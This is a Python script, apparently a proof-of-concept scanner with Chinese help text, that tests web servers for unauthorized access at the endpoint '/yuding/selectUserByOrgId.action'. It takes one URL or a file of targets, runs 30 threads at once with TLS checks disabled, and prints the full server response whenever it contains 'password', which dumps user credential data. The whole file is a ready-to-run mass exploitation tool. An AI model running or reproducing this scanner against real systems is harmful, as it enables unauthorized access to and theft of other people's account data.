import requests
import sys
import argparse
from multiprocessing.dummy import Pool
from urllib.parse import urlparse, urljoin

requests.packages.urllib3.disable_warnings()

def check(target):
    target = urljoin(target, "/yuding/selectUserByOrgId.action?record=")
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Cookie': 'JSESSIONID=41D2AB2FE13EBAEA8CECBCD9FAC5EEF8-n1',
    }
    try:
        response = requests.get(target, headers=headers, verify=False, timeout=300)
        if response.status_code == 200 and 'password' in response.text:
            print(response.text)
            print(f"[*] {target} Is Vulnerable")
        else:
            print(f"[!] {target} Not Vulnerable")
    except requests.exceptions.RequestException as e:
        print(f"[Error] {target} - {e}")

def main():
    parser = argparse.ArgumentParser(description="selectUserByOrgId未授权漏洞检测")
    parser.add_argument('-u', '--url', dest='url', type=str, help='请输入URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='请输入包含URL的文件')
    args = parser.parse_args()

    if args.url and args.file:
        print("[Error] 不能同时使用URL和文件参数")
        sys.exit(1)

    pool = Pool(30)

    if args.url:
        target = args.url if urlparse(args.url).scheme in ['http', 'https'] else f"http://{args.url}"
        pool.apply_async(check, (target,))
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
                targets = [target if urlparse(target).scheme in ['http', 'https'] else f"http://{target}" for target in targets]
                pool.map(check, targets)
        except IOError as e:
            print(f"[Error] 无法打开文件: {e}")

    pool.close()
    pool.join()

if __name__ == '__main__':
    main()